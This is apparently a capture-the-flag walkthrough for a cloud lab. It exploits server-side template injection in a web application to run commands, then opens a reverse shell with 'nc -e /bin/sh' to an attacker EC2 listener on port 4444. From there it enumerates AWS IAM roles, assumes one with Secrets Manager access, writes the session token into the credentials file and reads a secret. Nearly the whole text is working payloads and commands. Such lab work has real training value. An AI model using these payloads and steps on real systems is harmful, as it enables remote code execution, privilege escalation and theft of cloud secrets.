1. Acccess and exploit given web application with SSTI vulnerability

    ```html
    <div>{{''.__class__.__mro__[1].__subclasses__()[349]('ls',shell=True,stdout=-1).communicate()}}</div>
    ```

2. Prepare an EC2 instance which will serve as attaccker's server
   - Allow TCP traffic from victim's server coming to port `4444` in Security group
   - open port `4444` using `nc`
   -  you may use other ports instead of `4444`

    ```bash
    nc -lvp 4444
    ```

3. Run below payload on vulnerable web application
   - It will give control over `web application`'s server to `attacker`'s  server.

    ```html
    <div>{{''.__class__.__mro__[1].__subclasses__()[349]('nc -e /bin/sh Public_IP_address_of_attacking_server 4444 ',shell=True,stdout=-1).communicate()}}</div>
    ```
4. List IAM roles 
    - Use EC2 instance created at `2.`
    ```bash
    # List IAM role which contains word "SSTI"
    aws iam list-roles | grep SSTI
    ```
5. List attached policies of IAM role
   - Look for role which contains  `secretsmanager`

    ```bash
    aws iam list-attached-role-policcies --role-name name_of_role_you_want
    ```
6. Assume role

    ```bash
    aws --region us-east-1 sts assume-role --role-arn arn_of_role_you_want --role-session-name any_name
    ```

7. configure profile `assumed-role` to use credentials retrieved above

    ```bash
    aws configure --profile assumed-role
    ```

8. Use `echo` to add `aws_session_token` to `~/.aws/credentials`

    ```bash
    echo 'aws_session_token = SessionToken_retrieved_above' >> ~/.aws/credentials
    ```

9.  Access secrets using configured profiles 

    ```bash
    aws --region us-east-1 --profile assumed-role secretsmanager list-secrets | grep SSTI
    ```

10. Get flag

    ```bash
    aws --region us-east-1 --profile assumed-role secretsmanager get-secret-value --secret-id arn_of_flag
    ```
